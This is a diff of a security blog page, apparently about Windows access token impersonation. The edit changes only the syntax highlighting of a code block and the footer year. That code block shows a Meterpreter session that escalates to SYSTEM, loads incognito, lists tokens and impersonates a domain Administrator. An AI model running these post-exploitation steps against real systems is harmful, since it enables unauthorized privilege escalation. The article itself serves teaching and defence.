@@ -647,12 +647,12 @@ PS:这里的krbtgt hash就是之前讲的KDC Hash
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getsystem
-</span></span><span class="line"><span class="cl">meterpreter &gt; load incognito meterpreter &gt; list_tokens –u
-</span></span><span class="line"><span class="cl">Delegation Tokens Available ============================== NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEM PAYLOADS\Administrator PAYLOADS\w7
-</span></span><span class="line"><span class="cl">meterpreter &gt; impersonate_token &#34;PAYLOADS\\Administrator”
-</span></span><span class="line"><span class="cl">[+] Delegation token available
-</span></span><span class="line"><span class="cl">[+] Successfully impersonated user PAYLOADS\Administrator
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">getsystem</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="nb">load</span> <span class="n">incognito</span> <span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">list_tokens</span> <span class="err">–</span><span class="n">u</span>
+</span></span><span class="line"><span class="cl"><span class="n">Delegation</span> <span class="n">Tokens</span> <span class="n">Available</span> <span class="o">==============================</span> <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">LOCAL</span> <span class="n">SERVICENT</span> <span class="n">AUTHORITY</span>\<span class="n">NETWORK</span> <span class="n">SERVICENT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span> <span class="n">PAYLOADS</span>\<span class="n">Administrator</span> <span class="n">PAYLOADS</span>\<span class="n">w7</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">impersonate_token</span> <span class="s2">&#34;PAYLOADS</span><span class="se">\\</span><span class="s2">Administrator”</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Delegation</span> <span class="n">token</span> <span class="n">available</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">impersonated</span> <span class="n">user</span> <span class="n">PAYLOADS</span>\<span class="n">Administrator</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="windows-access-token令牌假冒防御">Windows Access Token令牌假冒防御</h3>
@@ -694,7 +694,7 @@ PS:这里的krbtgt hash就是之前讲的KDC Hash
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
